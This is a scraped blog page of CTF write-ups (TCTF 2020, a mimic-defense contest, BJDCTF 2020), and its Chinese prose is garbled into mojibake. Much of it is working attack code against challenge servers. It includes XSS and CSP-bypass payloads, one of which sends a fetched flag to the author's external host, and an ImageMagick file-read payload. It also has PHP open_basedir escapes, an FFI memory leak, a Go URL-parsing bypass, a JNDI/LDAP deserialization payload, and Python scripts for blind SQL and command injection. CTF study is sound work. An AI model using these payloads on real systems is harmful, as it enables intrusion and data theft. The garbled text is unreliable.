<pre><code>[{&quot;type&quot;:0,&quot;message&quot;:&quot;[../../image/mOFJpl/svg#\&quot;&gt;&lt;/g&gt;&lt;/svg&gt;&lt;script srsrcc=\&quot;/image/kOmxqd/jpg?callback=aaa\&quot;&gt;&lt;/script&gt;&lt;svg&gt;&lt;g&gt;&lt;image xlink:href=\&quot;]&quot;}]</code></pre><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629225818.png" alt="image1437"></p>
<p>æœç´¢<strong>ImageMagick convert ctf</strong> å‘ç°ï¼ŒImageMagick convertå¯ä»¥<a href="https://blog.bushwhackers.ru/googlectf-2019-gphotos-writeup/" target="_blank" rel="noopener">è¯»å–æ–‡ä»¶</a></p>
<p>æ„é€ :</p>
<pre><code>------WebKitFormBoundaryHJ88AZN7
Content-Disposition: form-data; name=&quot;data&quot;

[{&quot;type&quot;:0,&quot;message&quot;:&quot;[\&quot; href=\&quot;text:/etc/passwd\&quot; onerror=\&quot;//]&quot;}]
------WebKitFormBoundaryHJ88AZN7--</code></pre><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629230827.png" alt="image1845"></p>
<p>æµ‹è¯•å¸¸è§çš„æ–‡ä»¶åæ‰¾åˆ°æºæ–‡ä»¶ï¼šapp.py</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629230936.png" alt="image1953"></p>
<p>è¿™é‡Œæˆ‘ä»¬é‡ç‚¹å…³æ³¨responseJSONå’Œ secretè¿™ä¸¤ä¸ªå‡½æ•°</p>
<h3 id="ç¬¬äºŒéƒ¨åˆ†-xssç®¡ç†å‘˜"><a href="#ç¬¬äºŒéƒ¨åˆ†-xssç®¡ç†å‘˜" class="headerlink" title="ç¬¬äºŒéƒ¨åˆ† xssç®¡ç†å‘˜"></a>ç¬¬äºŒéƒ¨åˆ† xssç®¡ç†å‘˜</h3><p>secretæ˜¯è®©æˆ‘ä»¬xssç®¡ç†å‘˜ï¼Œä½†æ˜¯å­˜åœ¨csp:</p>
<pre><code>img-src * data:; default-src &#39;self&#39;; style-src &#39;self&#39; &#39;unsafe-inline&#39;; connect-src &#39;self&#39;; object-src &#39;none&#39;; base-uri &#39;self&#39;</code></pre><p>responseJSONå¯ä»¥è®©æˆ‘ä»¬åœ¨jsonæ•°æ®å‰åŠ ä¸Šxxx=,ç»“åˆæŠ¥é”™è¿”å›çš„æ•°æ®æ˜¯jsonæ ¼å¼ï¼Œå¦‚æœæˆ‘ä»¬èƒ½æ§åˆ¶æŠ¥é”™ä¿¡æ¯ï¼Œæˆ‘ä»¬å°±èƒ½ç»•è¿‡csp</p>
<p>å‰æ–‡å‘ç° ImageMagick çš„é‚£ä¸ªæ¥å£(share)åˆšå¥½å¯ä»¥æ§åˆ¶æŠ¥é”™ä¿¡æ¯</p>
<pre><code>previewid=`test&quot;},alert(1),{&quot;2&quot;:&quot;</code></pre><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629231535.png" alt="image2409"></p>
<p>æ¥ç€å°±æ˜¯è®©htmåŒ…å«å®ƒï¼š</p>
<pre><code>[{&quot;type&quot;:0,&quot;message&quot;:&quot;[../../image/mOFJpl/svg#\&quot;&gt;&lt;/g&gt;&lt;/svg&gt;&lt;link rel=\&quot;stylesheet\&quot; href=\&quot;/static/css/bootstrap.min.css\&quot;&gt;&lt;script ssrcrc=\&quot;/static/js/jquery-3.5.1.min.js\&quot;&gt;&lt;/script&gt;&lt;script ssrcrc=\&quot;/static/js/bootstrap.min.js\&quot;&gt;&lt;/script&gt;&lt;script srsrcc=\&quot;/image/kOmxqd/jpg?callback=aaa\&quot;&gt;&lt;/script&gt;&lt;svg&gt;&lt;g&gt;&lt;image xlink:href=\&quot;]&quot;}]</code></pre><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629231806.png" alt="image2848"></p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629231854.png" alt="image2936"></p>
<h3 id="å…¶ä»–è§£æ³•"><a href="#å…¶ä»–è§£æ³•" class="headerlink" title="å…¶ä»–è§£æ³•"></a>å…¶ä»–è§£æ³•</h3><p>ä¸€å¶é£˜é›¶å¤§å¤§çš„wpï¼š</p>
<p> <a href="https://skysec.top/2020/06/27/2020-TCTF-Online-Web-WriteUp/#Wechat-Generator" target="_blank" rel="noopener">https://skysec.top/2020/06/27/2020-TCTF-Online-Web-WriteUp/#Wechat-Generator</a> </p>
<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><pre><code> &lt;?php
if (isset($_GET[&#39;rh&#39;])) {
    eval($_GET[&#39;rh&#39;]);
} else {
    show_source(__FILE__);
}</code></pre><p>å¾ˆç®€å•çš„æºä»£ç ,é¦–å…ˆæŸ¥çœ‹phpinfo:</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200629232130.png" alt="image3265"></p>
<p>open_basedir: /var/www/html ä¸”è¯¥ç›®å½•ä¸å¯å†™ï¼Œtwitterä¸Šé‚£ä¸ªç»•è¿‡open_basedirçš„æ–¹æ³•å°±æ²¡ç”¨äº†</p>
<p>åˆ©ç”¨</p>
<pre><code>$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f){echo($f-&gt;__toString().&#39; &#39;);};</code></pre><p>åˆ—ç›®å½•ï¼š</p>
<pre><code>bin dev etc flag.h flag.so home lib media mnt opt proc root run sbin srv start.sh sys tmp usr var</code></pre><p>çœ‹åˆ°flag.h+flag.so+ffiçŒœæµ‹æ˜¯è¦ç”¨ffiæ¥åŠ è½½flag.hç„¶åæ‰§è¡Œå…¶ä¸­çš„æ–¹æ³•ï¼Œ</p>
<p>æµ‹è¯•åå‘ç° ffi::load æ— è§†open_basedir ,ä½†æ˜¯åªèƒ½åŠ è½½ /flag.h</p>
<p>å½“æˆ‘ä»¬åˆä¸çŸ¥é“flag.hä¸­çš„å‡½æ•°å®šä¹‰ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p>
<p>åæ¥è¿™é¢˜æ˜¯å› ä¸ºåˆ«äººæŠŠé¢˜ç›®æ‰“ç©¿äº†ï¼Œå…¨åœºç»•è¿‡open_basedirï¼Œè¯»å–äº†flag</p>
<h2 id="noeasyphp"><a href="#noeasyphp" class="headerlink" title="noeasyphp"></a>noeasyphp</h2><p>è¿™é¢˜å¬è¯´æ˜¯å› ä¸ºå‡ºé¢˜äººå› ä¸ºeasyphpé‡å‡ºçš„é¢˜ç›®</p>
<p>è¿™é‡Œå°±è¦ç›´é¢åˆšåˆšæ˜æ˜æ— æ³•è¯»å–flag.håˆè¦äº†è§£flag.hä¸­çš„å‡½æ•°å£°æ˜</p>
<p>å› ä¸ºè¿™é‡Œæœ‰ffiï¼Œå¯ä»¥ç›´æ¥æ“ä½œç³»ç»Ÿçš„åº•å±‚ï¼Œæˆ‘ä»¬è¯•è¯•å†…å­˜æ³„éœ²</p>
<pre><code class="php">$c=FFI::load(&quot;/flag.h&quot;);
$b=FFI::cast(&quot;void *&quot;,FFI::new(&quot;int[1]&quot;,false));
$a=FFI::string($b-400000,400000);
var_dump($a);
</code></pre>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200630000339.png" alt="image4044"></p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200630000414.png" alt="image4128"></p>
<p>å¥½ç©.jpg</p>
<h2 id="Cloud-Computing"><a href="#Cloud-Computing" class="headerlink" title="Cloud Computing"></a>Cloud Computing</h2><pre><code class="php">&lt;?php mkdir(&#39;/var/www/html/sandbox/362495b25219141379062025d7d6d775772e6b7d/test2&#39;);chdir(&#39;/var/www/html/sandbox/362495b25219141379062025d7d6d775772e6b7d/test2&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);echo(file_get_contents(&#39;/flag&#39;));</code></pre>
<p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2020/06/30/tctf2020/">http://blog.ccreater.top/2020/06/30/tctf2020/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/06/30/tctf2020/" data-id="ckc0pf8nx0000asv01sp72qjd" data-title="tctf2020" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-æ‹Ÿæ€é˜²å¾¡è®°å½•" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/06/23/%E6%8B%9F%E6%80%81%E9%98%B2%E5%BE%A1%E8%AE%B0%E5%BD%95/" class="article-date">
  <time class="dt-published" datetime="2020-06-23T01:27:13.866Z" itemprop="datePublished">2020-06-23</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">æ¯”èµ›</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/06/23/%E6%8B%9F%E6%80%81%E9%98%B2%E5%BE%A1%E8%AE%B0%E5%BD%95/">æ‹Ÿæ€é˜²å¾¡è®°å½•</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p> ./sancheck.php</p>
<pre><code class="go">package main

import (
    &quot;fmt&quot;
    &quot;io/ioutil&quot;
    &quot;log&quot;
    &quot;net/http&quot;
    &quot;net/url&quot;
    &quot;strings&quot;
)

var (
    secret   = &quot;xiaomo.wabzsy&quot;
    banner   = &quot;Golang HTTP Server (v2.3.3)&quot;
    template = `&lt;!DOCTYPE html&gt;
&lt;html&gt;
    &lt;head&gt;
        &lt;title&gt;San Check&lt;/title&gt;
    &lt;/head&gt;
    &lt;body&gt;
        &lt;form method=&quot;POST&quot;&gt;
            &lt;input type=&quot;text&quot; name=&quot;url&quot; /&gt;
            &lt;input type=&quot;submit&quot; value=&quot;æ·¦!&quot; /&gt;
        &lt;/form&gt;
        &lt;pre&gt;
%s
        &lt;/pre&gt;
    &lt;/body&gt;
    &lt;!-- ./sancheck.php --&gt;
&lt;/html&gt;`
)

func SanCheck(input string) error {
    u, err := url.Parse(input)

    if err != nil {
        return err
    }

    if u.Scheme != &quot;http&quot; {
        return fmt.Errorf(&quot;err: Invalid Scheme [%s]&quot;, u.Scheme)
    }

    if u.Opaque != &quot;&quot; {
        return fmt.Errorf(&quot;err: WHAT AER YOU DOING ?!!! (%s)&quot;, u.Opaque)
    }

    if u.Hostname() != &quot;127.0.0.1&quot; {
        return fmt.Errorf(&quot;err: Invalid Hostname [%s]&quot;, u.Hostname())
    }

    if u.Port() != &quot;&quot; &amp;&amp; u.Port() != &quot;80&quot; {
        return fmt.Errorf(&quot;err: Invalid Port [%s]&quot;, u.Port())
    }

    if u.User == nil {
        return fmt.Errorf(&quot;err: Authorization Required&quot;)
    }

    if u.User.Username() != &quot;root&quot; {
        return fmt.Errorf(&quot;err: Invalid Username [%s]&quot;, u.User.Username())
    }

    if password, set := u.User.Password(); !set || password != &quot;P@ssw0rd!&quot; {
        return fmt.Errorf(&quot;err: Invalid Password [%s]&quot;, password)
    }

    if u.RequestURI() != &quot;/flag.php&quot; {
        return fmt.Errorf(&quot;err: Invalid RequestURI [%s]&quot;, u.RequestURI())
    }

    if u.Fragment != &quot;&quot; {
        return fmt.Errorf(&quot;err: Invalid Fragment [%s]&quot;, u.Fragment)
    }

    if !strings.Contains(u.String(), &quot;&#39;Pwned!&#39;&quot;) {
        return fmt.Errorf(&quot;err: San Check failed&quot;)
    }

    return nil
}

func DefaultHandler(w http.ResponseWriter, req *http.Request) {

    input := req.PostFormValue(&quot;url&quot;)

    if input == &quot;&quot; {
        Response(w, template, &quot;Where is the flag?&quot;)
        return
    }

    if err := SanCheck(input); err == nil {
        req, _ := http.NewRequest(&quot;GET&quot;, input, nil)
        req.Header.Add(&quot;Secret&quot;, secret)
        if resp, err := (&amp;http.Client{}).Do(req); err == nil {
            if body, err := ioutil.ReadAll(resp.Body); err == nil {
                Response(w, template, string(body))
            }
            _ = resp.Body.Close()
        } else {
            Response(w, template, err.Error())
        }
    } else {
        Response(w, template, err.Error())
    }
}

func FlagHandler(w http.ResponseWriter, req *http.Request) {
    if strings.Join(req.Header[&quot;Secret&quot;], &quot;&quot;) != secret {
        Forbidden(w)
    } else if !strings.HasPrefix(req.RemoteAddr, &quot;127.0.0.1&quot;) {
        Forbidden(w)
    } else {
        Response(w, &quot;&lt;h1&gt;%s&lt;/h1&gt;&quot;, readFlag())
    }
}

func readFlag() string {
    if bs, err := ioutil.ReadFile(&quot;./flag.txt&quot;); err == nil {
        return string(bs)
    } else {
        return fmt.Sprintf(&quot;Unable to read flag.txt, please contact technical support.(%s)&quot;, err.Error())
    }
}

func CodeHandler(w http.ResponseWriter, _ *http.Request) {
    w.Header().Set(&quot;Content-Type&quot;, &quot;text/plain; charset=utf-8&quot;)
    w.Header().Set(&quot;Server&quot;, banner)
    if bs, err := ioutil.ReadFile(&quot;main.go&quot;); err == nil {
        _, _ = w.Write(bs)
    } else {
        _, _ = w.Write(
            []byte(
                fmt.Sprintf(&quot;Unable to read main.go, please contact technical support.(%s)&quot;,
                    err.Error(),
                ),
            ),
        )
    }
}

func Forbidden(w http.ResponseWriter) {
    w.WriteHeader(403)
    Response(w, &quot;&lt;h1&gt;%s&lt;/h1&gt;&quot;, &quot;403 Forbidden&quot;)
}

func Response(w http.ResponseWriter, tpl string, response string) {
    w.Header().Set(&quot;Content-Type&quot;, &quot;text/html; charset=utf-8&quot;)
    w.Header().Set(&quot;Server&quot;, banner)
    if _, err := fmt.Fprintf(w, tpl, response); err != nil {
        log.Println(err)
    }
}

func main() {
    http.HandleFunc(&quot;/&quot;, DefaultHandler)
    http.HandleFunc(&quot;/flag.php&quot;, FlagHandler)
    http.HandleFunc(&quot;/sancheck.php&quot;, CodeHandler)
    log.Fatal(http.ListenAndServe(&quot;:80&quot;, nil))
}</code></pre>
<p>æ ¹æ®issue<a href="https://github.com/golang/go/issues/29098" target="_blank" rel="noopener">https://github.com/golang/go/issues/29098</a> ç»•è¿‡</p>
<p><code>http://root:P@ssw0rd!@127.0.0.1]&#39;Pwned!&#39;]:80/flag.php#</code></p>
<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p><a href="mailto:ccreater@163.com">ccreater@163.com</a>  E6N0HT aa05940594</p>
<p>cmd={â€œ/expandocolumn/add-columnâ€:{}}&amp;p_auth=Gyr2NhlX&amp;formDate=1585307550388&amp;tableId=1&amp;name=1&amp;type=1&amp;+defaultData:com.mchange.v2.c3p0.JndiRefForwardingDataSource={â€œjndiNameâ€:â€ldap://127.0.0.1:1389/Objectâ€,â€loginTimeoutâ€:0}</p>
<h2 id="ç™½ç›’æ‹Ÿæ€è·¯ç”±"><a href="#ç™½ç›’æ‹Ÿæ€è·¯ç”±" class="headerlink" title="ç™½ç›’æ‹Ÿæ€è·¯ç”±"></a>ç™½ç›’æ‹Ÿæ€è·¯ç”±</h2><pre><code>vtysh
conf t
ip route 200.14.1.0/24 x.x.x.x</code></pre><h2 id="ç™½ç›’æ‹Ÿæ€åŸŸåæœåŠ¡å™¨"><a href="#ç™½ç›’æ‹Ÿæ€åŸŸåæœåŠ¡å™¨" class="headerlink" title="ç™½ç›’æ‹Ÿæ€åŸŸåæœåŠ¡å™¨"></a>ç™½ç›’æ‹Ÿæ€åŸŸåæœåŠ¡å™¨</h2><p>ä¸Šä¼ busybox æ¥ä½¿ç”¨nslookupç­‰å‘½ä»¤</p>
<pre><code>cat /etc/name.conf
æ ¹æ®é…ç½®ä¿®æ”¹
sudo /usr/local/bind-9.11.19/bin/named/named
busybox nslookup www.test.com 172.29.126.2 çœ‹ç»“æœ</code></pre><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2020/06/23/æ‹Ÿæ€é˜²å¾¡è®°å½•/">http://blog.ccreater.top/2020/06/23/æ‹Ÿæ€é˜²å¾¡è®°å½•/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/06/23/%E6%8B%9F%E6%80%81%E9%98%B2%E5%BE%A1%E8%AE%B0%E5%BD%95/" data-id="ckbr91buj0000d0v08mwg1evw" data-title="æ‹Ÿæ€é˜²å¾¡è®°å½•" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf-wp/" rel="tag">ctf,wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-2020ç¬¬ä¸‰å±ŠBJDCTF" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/05/24/2020%E7%AC%AC%E4%B8%89%E5%B1%8ABJDCTF/" class="article-date">
  <time class="dt-published" datetime="2020-05-23T16:40:57.277Z" itemprop="datePublished">2020-05-24</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">æ¯”èµ›</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/05/24/2020%E7%AC%AC%E4%B8%89%E5%B1%8ABJDCTF/">2020ç¬¬ä¸‰å±ŠBJDCTF</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="2020BJDCTFç¬¬ä¸‰å±Š"><a href="#2020BJDCTFç¬¬ä¸‰å±Š" class="headerlink" title="2020BJDCTFç¬¬ä¸‰å±Š"></a>2020BJDCTFç¬¬ä¸‰å±Š</h1><h2 id="å¸®å¸®å°çº¢èŠ±"><a href="#å¸®å¸®å°çº¢èŠ±" class="headerlink" title="å¸®å¸®å°çº¢èŠ±"></a>å¸®å¸®å°çº¢èŠ±</h2><pre><code class="php"># -*-coding:utf-8 -*-
import requests
import re

flag_format = re.compile(&#39;flag\\{[0-9a-z]{8}-[0-9a-z]{4}-[0-9a-z]{4}-[0-9a-z]{4}-[0-9a-z]{12}\\}&#39;)
all_letter = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ-0123456789abcdefghijklmnopqrstuvwxyz()}{_&#39;


def get_flag(command):
    try:
        r = requests.get(&#39;http://183.129.189.60:10071&#39;, params={&#39;imagin&#39;: command}, timeout=9)
    except:
        return True
    return False


if __name__ == &#39;__main__&#39;:
    flag = &#39;BJD{make_iptables_great_again}&#39;
    while flag_format.match(flag) == None:
        staus = 0
        for i in all_letter:
            payload = &#39;cat /flag|grep %s &amp;&amp;sleep 10&#39; % (flag + i)
            print(payload)
            if get_flag(payload):
                staus = 1
                flag += i
                print(flag)
                break
        if staus == 0:
            flag = flag[0:-1]
</code></pre>
<h2 id="gob"><a href="#gob" class="headerlink" title="gob"></a>gob</h2><p><img src="C:%5CUsers%5C%E8%94%A1%E5%BB%BA%E6%96%8C%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200523090430266.png" alt="image968"></p>
<p>å¯èƒ½å­˜åœ¨ååºåˆ—åŒ–</p>
<p>å’Œæ–‡ä»¶å†…å®¹æ— å…³</p>
<p>ä¸Šä¼ æ–‡ä»¶åå‘ç°æœ‰ä¸ªfilenameå­—æ®µï¼Œshowç•Œé¢æ˜¯ç›´æ¥å‡ºç°å›¾ç‰‡çš„base64ç¼–ç ï¼Œå¦‚æœæˆ‘ä»¬èƒ½æ§åˆ¶filenameå­—æ®µå°±æœ‰å¯èƒ½ä»»æ„è¯»å–</p>
<p>å½“å”¯ä¸€éº»çƒ¦çš„æ˜¯ï¼Œæ–‡ä»¶ååé¢æœ‰ä¸ªmd5æ ¡éªŒå€¼</p>
<p>ä½†æ˜¯å½“æˆ‘ä»¬ç›´æ¥ä¸Šä¼ çš„æ—¶å€™å¥¹ä¼šç”Ÿæˆä¸€ä¸ªï¼Œå“ªæ€•æ²¡ä¸Šä¼ æˆåŠŸ</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200523095410.png" alt="image1220"></p>
<p>ç›´æ¥æ‹¿æ¥ç”¨è®¿é—®show.phpå°±æ‹¿åˆ°flagäº†</p>
<h2 id="Multiplayer-Sports"><a href="#Multiplayer-Sports" class="headerlink" title="Multiplayer Sports"></a>Multiplayer Sports</h2><p> Powered by beego 1.12.1 </p>
<p><a href="http://183.129.189.60:10112/?by=desc" target="_blank" rel="noopener">http://183.129.189.60:10112/?by=desc</a></p>
<p>é»‘åå•:<code>&#39;,&quot;,!,#,$,&amp;,+,;,&lt;,=,&gt;,?,@,\,|,if,exp,info,ascii,ord,sys,count,order,by,author,where</code></p>
<p>ç»™äº†ä¸ªhint:<code>table</code>,ä¸çŸ¥é“å•¥æ„æ€</p>
<pre><code class="python">
import requests
import time
import string


def sqlinj(num):

    burp0_url = &quot;http://183.129.189.60:10117/&quot;
    param={&quot;by&quot;:&quot;,extractvalue(1,(case when ((select conv(right(left(hex( (select group_concat(a,b) from (select 1`a`,2`b` union select * from hint )`ff` ) ),{POS}),2),16,10)  )-{GUESS}) then 1 ELSE user() end))&quot;.format(POS=pos,GUESS=num)}
    burp0_cookies = {&quot;PHPSESSID&quot;: &quot;Q/+BAwEBBVVzZXJzAf+CAAEEAQhVc2VybmFtZQEMAAEIUGFzc3dvcmQBDAABCEZpbGVuYW1lAQwAAQRTaWduAQwAAABj/4IBA2FhYQEDYmJiATIuL3VwbG9hZHMvM2UxMDRjYWU2NDAxZDI1NzY2NzZiMmM2ODk3MzE1NGQvcTEuanBnASBhMjVhY2E4OGZkOGYzYjYyMTkyZTYxNzgwMDYzNWQ4NAA=&quot;, &quot;_xsrf&quot;: &quot;azI3QUxLb3JwTDh5MFI5aXlPM1ZOQ2Y4UnNUSkVnY3E=|1590202537824785027|837f32c5f7f2b6c2a5ad0ffbcc803dff791bb5a078a0b68ea40428f37dfdf2ae&quot;}
    burp0_headers = {&quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
    r=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,params=param)
    time.sleep(0.5)
    print(param)
    if &quot;/static/img/dundundun.gif&quot; in r.text:
        print(&quot;filter &quot;,param)
        exit()
    if &quot;y1ng&quot; in r.text:

        return False
    else :
        return True




#database: ms
#mysql,sys
#Hint: /Source Password
#table:gtid_executed,sys_config
result=&quot;12,Hint: /Source Password: T1Me&quot;
pos=len(result)*2+2

while True:
    flag=False
    for i in string.printable:
        if sqlinj(ord(i)):
            result+=i
            print(&quot;Found:&quot;+result)
            flag=True
            break
        print(&quot;result:&quot;+result)
    pos+=2
    if flag is False:
        break</code></pre>
<h2 id="notes"><a href="#notes" class="headerlink" title="notes"></a>notes</h2><p><a href="http://www.zip" target="_blank" rel="noopener">www.zip</a></p>
<p>flag.php</p>
<pre><code class="php">if ($_SERVER[&#39;REMOTE_ADDR&#39;] === &#39;172.26.176.2&#39;) //only admin, who is at 172.26.176.2, can get FLAG
    echo FLAG;
else echo $_SERVER[&#39;REMOTE_ADDR&#39;];
</code></pre>
<p>botè„šæœ¬ï¼š</p>
<pre><code class="php">
if (isset($_POST[&#39;url&#39;]) &amp;&amp; isset($_POST[&#39;captcha&#39;]) ) { // report bug to our admin who is at 172.26.176.2, our admin will access the bug url to check
    $url = $_POST[&#39;url&#39;];
    $captcha = $_POST[&#39;captcha&#39;];
    if ( checkNote($url) &amp;&amp; checkNote(urldecode($url)) &amp;&amp; checkURL($url) &amp;&amp;  substr(md5($captcha), 0 , 6) === $_SESSION[&#39;captcha&#39;] ) {
        //admin checking, it will take several seconds

    } else alertMes(&#39;something wrong&#39;, &#39;./report_bugs.php&#39;);
}
?&gt;</code></pre>
<pre><code class="php">function checkURL($url) {
    if ( preg_match(&#39;/[|~`^;&amp;]/m&#39;, $url) )
        return false;
    else return true;
}
function checkNote($s) {
    $filter = &#39;/show|svg|archive|error|eval|on|atob|\\\u|&amp;#|let|cookie|meta|create|fetch|f[^a-z]*l[^a-z]*a[^a-z]*g|src|append|&lt;script&gt;|func|javascript|res|lo|then|ftp|const|ajax|\$|\&#39;|\&quot;/imX&#39;;
    if (preg_match($filter, $s) || strlen($s) &gt;= 500 || strlen($s) &lt;= 1) return false;
    else return true;
}</code></pre>
<p>csp:<code>Content-Security-Policy: default-src &#39;self&#39; &#39;unsafe-inline&#39; &#39;unsafe-eval&#39;; img-src &#39;self&#39;; object-src &#39;none&#39;; require-trusted-types-for &#39;script&#39;;</code></p>
<p>ç»•è¿‡</p>
<pre><code class="javascript">&lt;script &gt;xmlhttp=new XMLHttpRequest();
xmlhttp[`\x6fnreadystatechange`]=()=&gt;{if(xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200){document[`\x6cocati\x6fn`][`href`]=`http://ccreat\x65r.top:60006/`+xmlhttp[`\x72espo\x6eseText`];}};xmlhttp.open(`GET`,`/lib\x2ffla\x67.php`,true);xmlhttp.send();&lt;/script&gt;</code></pre>
<p>æ‹¿åˆ°flag</p>
<h2 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h2><p> <a href="http://183.129.189.60:10057/" target="_blank" rel="noopener">http://183.129.189.60:10057/</a> </p>
<pre><code>/flag.php
/index.php
/log.php
/login.php
/www.zip</code></pre><p>flag.php</p>
<pre><code class="php">flag.phpå…³é”®ä»£ç å¦‚ä¸‹ï¼š
$classname = $_GET[&#39;classname&#39;];
$data = $_GET[&#39;data&#39;];
$class = new $classname($data[&#39;a&#39;], $data[&#39;b&#39;]);
Only users from the website can request this page. flag in /flag, have fun!</code></pre>
<p>å…ˆç™»é™†åº·åº·,éœ€è¦key,ç›¸å…³ä»£ç åœ¨:</p>
<pre><code class="php">&lt;?php
    header(&quot;content-type:text/html;charset=utf-8&quot;);
    session_start();
    function getkey()
    {
        $key = &#39;&#39;;
        $chars = str_split(&#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;);
        for ($i = 0; $i &lt; 48; $i++)
        {
            $key = $key . $chars[random_int(0, 61)];
        }
        $_SESSION[&#39;key&#39;] = $key;
        return $key;
    }
    function getreferer() {
        static $referer;
        if (isset($_SERVER[&#39;HTTP_REFERER&#39;])) {
                $referer = $_SERVER[&#39;HTTP_REFERER&#39;];
            }
        elseif(isset($_POST[&#39;URL_REFERER&#39;])){
                $referer = $_POST[&#39;URL_REFERER&#39;];
            }
        else{
            die(&quot;Where are you from?&quot;);
        }
        return $referer;
    }
        $key = getkey();
        $url = getreferer();
        if(!preg_match(&quot;/^http[s]{0,1}:\/\//i&quot;, $url)){
            die(&quot;What do you want to do?&quot;);
        }
        $host = parse_url($url, PHP_URL_HOST);
        if(preg_match(&quot;/^google\.com$/i&quot;, $host) or preg_match(&quot;/(.*)\.google\.com$/i&quot;, $host)){
            $headers = get_headers($url,1);
            if($headers[&#39;dd&#39;] === &#39;MeAquaNo_1!!!&#39;){
                echo $key;
            }
            else{
                echo &#39;dd beheading!&#39;;
            }
        }
        else{
            die(&quot;Only dd working at Google can get the key!&quot;);
        }</code></pre>
<h2 id="è€å¼€å‘"><a href="#è€å¼€å‘" class="headerlink" title="è€å¼€å‘"></a>è€å¼€å‘</h2><p> <a href="http://183.129.189.60:10000/" target="_blank" rel="noopener">http://183.129.189.60:10000/</a> </p>
<p><img src="C:%5CUsers%5C%E8%94%A1%E5%BB%BA%E6%96%8C%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200523230022093.png" alt="image6583"></p>
<p><img src="C:%5CUsers%5C%E8%94%A1%E5%BB%BA%E6%96%8C%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200523230029887.png" alt="image6695"></p>
<p>User.php</p>
<pre><code class="php">&lt;?php
if ($_SERVER[&#39;SCRIPT_FILENAME&#39;] == __FILE__)
